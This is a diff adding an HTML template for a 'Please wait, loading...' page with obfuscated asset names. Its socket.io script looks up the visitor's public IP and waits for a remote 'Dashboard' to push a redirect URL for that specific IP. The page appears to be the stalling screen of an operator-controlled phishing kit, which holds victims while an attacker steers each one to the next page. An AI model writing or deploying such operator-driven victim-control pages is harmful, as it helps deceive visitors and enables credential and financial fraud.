@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="refresh" content="<%=time%>; url=<%=url%>">
+    <link rel="stylesheet" href="./css/bratoka.css">
+    <style>
+      .spinner {
+        border: 16px solid #f3f3f3;
+        border-top: 16px solid yellow;
+        border-radius: 50%;
+        width: 120px;
+        height: 120px;
+        animation: spin 2s linear infinite;
+        margin: 20px auto;
+      }
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+      .loading-text {
+        font-size: 1.2em;
+        margin-top: 10px;
+        text-align: center;
+        color: #333;
+      }
+      .loading {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+      @media (max-width: 668px) {
+        .spinner{
+        width: 60px;
+        height: 60px;
+        border-radius: 50%;
+        border: 10px solid #f3f3f3;
+        border-top: 10px solid yellow;
+    }
+    .loading-text{
+        font-size: 15px;
+    }
+      }
+    </style>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+</head>
+<body>
+    <div>
+        <div class="topano">
+            <img src="./img/hedopa-pc.PNG" alt="">
+            <img src="./img/hedopa-mb.png" alt="">
+        </div>
+    </div>
+    
+    <div class="loading">
+      <div class="spinner"></div>
+      <div class="loading-text">Please wait, loading...</div>
+    </div>
+    
+    
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+      async function getPublicIP() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    console.log("Public IP:", data.ip);
+    return data.ip;
+  } catch (error) {
+    console.error("Failed to fetch IP:", error);
+    return null;
+  }
+}
+      const socket = io();
+     
+      // Handle redirect messages from server
+      socket.on('redirect', async (data) => {
+        const currentIp = await getPublicIP();
+        console.log("Dashboard: "+data.ip,"Client: "+currentIp);
+        
+        if (data.ip === currentIp || data.ip == "::1" || data.ip=="::ffff:127.0.0.1" ) {
+
+          window.location.href = data.url;
+        }
+      });
+      </script>
+</body>
+</html>
